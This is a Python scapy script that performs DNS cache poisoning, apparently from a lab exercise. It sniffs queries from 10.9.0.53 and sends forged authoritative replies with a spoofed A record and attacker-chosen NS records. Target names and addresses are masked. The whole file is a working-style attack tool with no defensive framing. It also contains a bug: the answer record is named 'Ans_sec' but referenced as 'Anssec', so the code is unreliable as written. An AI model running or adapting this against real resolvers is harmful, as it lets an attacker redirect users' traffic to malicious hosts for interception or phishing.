#!/usr/bin/env python3
from scapy.all import *

def dns_spoofing(packet):
  if (DNS in packet and '****' in packet[DNS].qd.qname.decode('utf-8')):
    packet.show()
    # Swap the source and destination IP address
    IPpacket = IP(dst=packet[IP].src, src=packet[IP].dst)

    # Swap the source and destination port number
    UDPpacket = UDP(dport=packet[UDP].sport, sport=53)

    # The Answer Section
    Ans_sec = DNSRR(rrname=packet[DNS].qd.qname, type='A',
                 ttl=259200, rdata='****')

    # The Authority Section
    NS_sec1 = DNSRR(rrname='****', type='NS',
                   ttl=259200, rdata='****')
    NS_sec2 = DNSRR(rrname='****', type='NS',
                   ttl=259200, rdata='****')

    # Construct the DNS packet
    DNSpacket = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=0,
                 an=Anssec, ns=NS_sec1/NS_sec2)

    # Construct the entire IP packet and send it out
    spoof_packet = IPpacket/UDPpacket/DNSpacket
    send(spoof_packet)

# Sniff UDP query packets and invoke dns_spoofing().
f = 'udp and src host 10.9.0.53 and dst port 53'
packet = sniff(iface='****', filter=f, prn=dns_spoofing)      
